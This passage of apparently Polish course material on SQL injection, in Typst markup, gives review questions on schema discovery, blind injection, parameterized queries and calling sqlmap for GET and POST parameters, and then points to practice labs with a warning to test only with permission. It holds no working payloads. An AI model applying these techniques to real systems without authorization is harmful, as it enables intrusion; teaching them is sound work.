+ Skąd atakujący poznaje nazwy tabel i kolumn, skoro nie ma dostępu do kodu aplikacji?
+ Które techniki wstrzyknięcia działają, gdy aplikacja nie wyświetla wyniku zapytania? Jak odczytują
  dane?
+ Dlaczego zapytanie parametryzowane blokuje atak, skoro wartość atakującego nadal dociera do bazy?
+ Czym różni się wywołanie sqlmap dla parametru GET od wywołania dla pola wysyłanego metodą POST?

#v(1.5em)
#ramka("DALSZA PRAKTYKA", accent, accent-light)[
  #set text(9.5pt)
  Do dalszych ćwiczeń można wykorzystać
  #link("https://portswigger.net/web-security/sql-injection")[PortSwigger Web Security Academy]
  (bezpłatne laboratoria z wstrzyknięć SQL, z ćwiczeniem i rozwiązaniem dla każdej techniki) oraz
  aplikację OWASP Juice Shop. Testy należy prowadzić wyłącznie we własnym środowisku lub za pisemną
  zgodą właściciela systemu.
]
